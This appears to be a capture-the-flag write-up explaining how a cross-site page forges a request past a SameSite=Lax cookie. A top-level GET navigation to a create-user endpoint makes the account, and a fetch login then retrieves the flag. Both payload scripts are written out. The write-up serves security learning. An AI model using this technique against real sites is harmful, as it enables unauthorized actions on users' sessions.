cors-heavy
======================

Compared with the previous challenge, our code is now hosted on `usercontent.example.net`. This means we're occupying a cross-site position relative to the application hosted on `app.example.com`.

Secondly, `/chal4/create-user` now requires a user session, and that session cookie is `SameSite=Lax`:

```python
if not session.get("chal4_bot", False):
    return jsonify({"error": "unauthenticated"}), 403
```

The `Lax` parameter omits cookies on every cross-site request except top level navigation using a safe method (GET, HEAD, OPTIONS, TRACE).

Since `create-user` accepts both GET and POST, and reads its arguments from `request.args`, we can pass arguments using both a form post or a GET request with query string arguments.

We can use the latter in a top level navigation like this:

```html
<script>
  window.location =
    "http://app.example.com/chal4/create-user?username=x2gxd5z&password=fxo5aub";
</script>
```

Since this is a top level navigation and a GET request, our `SameSite=Lax` cookie will be sent on the request. So our request goes through and our user gets created. 

Finally, we send a second submission which logs into the app and retrieves the flag:

```html
<script>
  fetch("http://app.example.com/chal4/login", {
    method: "POST",
    body: new URLSearchParams({ username: "x2gxd5z", password: "fxo5aub" }),
  })
    .then((r) => r.text())
    .then((t) => console.log(t));
</script>

```
